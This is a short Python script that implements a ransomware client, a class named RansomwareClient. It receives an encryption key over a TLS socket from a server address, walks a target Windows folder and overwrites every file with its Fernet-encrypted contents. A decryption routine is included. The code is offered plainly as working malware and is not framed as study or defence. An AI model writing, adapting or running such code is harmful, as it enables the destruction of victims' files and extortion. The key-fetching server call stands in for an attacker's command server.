import os
import socket
import ssl
from cryptography.fernet import Fernet

class RansomwareClient:
    def __init__(self, key):
        self.cipher = Fernet(key)

    def iterate_directory(self, dirpath, action_func):
        for root, dirs, files in os.walk(dirpath):
            for filename in files:
                filepath = os.path.join(root, filename)
                action_func(filepath)
                print(f"Processed: {filepath}")

    def encrypt_file(self, path):
        with open(path, "rb") as f:
            original_data = f.read()
        
        encrypted_data = self.cipher.encrypt(original_data)
        
        with open(path, "wb") as f:
            f.write(encrypted_data)

    def decrypt_file(self, path):
        with open(path, "rb") as f:
            encrypted_data = f.read()
            
        decrypted_data = self.cipher.decrypt(encrypted_data)
        
        with open(path, "wb") as f:
            f.write(decrypted_data)

if __name__ == "__main__":
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = ssl.wrap_socket(raw_sock)
    
    try:
        ssl_sock.connect(("127.0.0.1", 8080))
        key = ssl_sock.recv(1024)
        
        ransomware = RansomwareClient(key)
        target_directory = "C:/Documents/TargetFolder/"
        
        ransomware.iterate_directory(target_directory, ransomware.encrypt_file)
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssl_sock.close()